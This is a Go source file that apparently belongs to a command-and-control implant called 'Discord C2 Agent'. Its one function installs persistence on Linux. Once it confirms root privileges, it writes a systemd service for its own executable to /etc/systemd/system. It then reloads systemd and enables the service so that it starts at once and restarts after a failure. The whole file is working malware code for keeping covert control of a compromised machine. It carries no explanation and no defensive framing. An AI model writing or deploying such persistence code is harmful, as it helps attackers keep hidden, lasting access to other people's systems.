//go:build linux

package linux

import (
	"fmt"
	"os"
	"os/exec"
)

// InstallPersistence installs the agent as a systemd service.
func (p *LinuxPlatform) InstallPersistence() (string, error) {
	if os.Geteuid() != 0 {
		return "", fmt.Errorf("must be run as root to install persistence")
	}

	exePath, err := os.Executable()
	if err != nil {
		return "", err
	}

	serviceContent := fmt.Sprintf(`[Unit]
Description=Discord C2 Agent
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
`, exePath)

	servicePath := "/etc/systemd/system/discord-c2-agent.service"
	err = os.WriteFile(servicePath, []byte(serviceContent), 0644)
	if err != nil {
		return "", fmt.Errorf("failed to write systemd service file: %w", err)
	}

	cmd := exec.Command("systemctl", "daemon-reload")
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("failed to reload systemd daemon: %w", err)
	}

	cmd = exec.Command("systemctl", "enable", "--now", "discord-c2-agent.service")
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("failed to enable systemd service: %w", err)
	}

	return fmt.Sprintf("Persistence installed successfully. Service file at %s", servicePath), nil
}
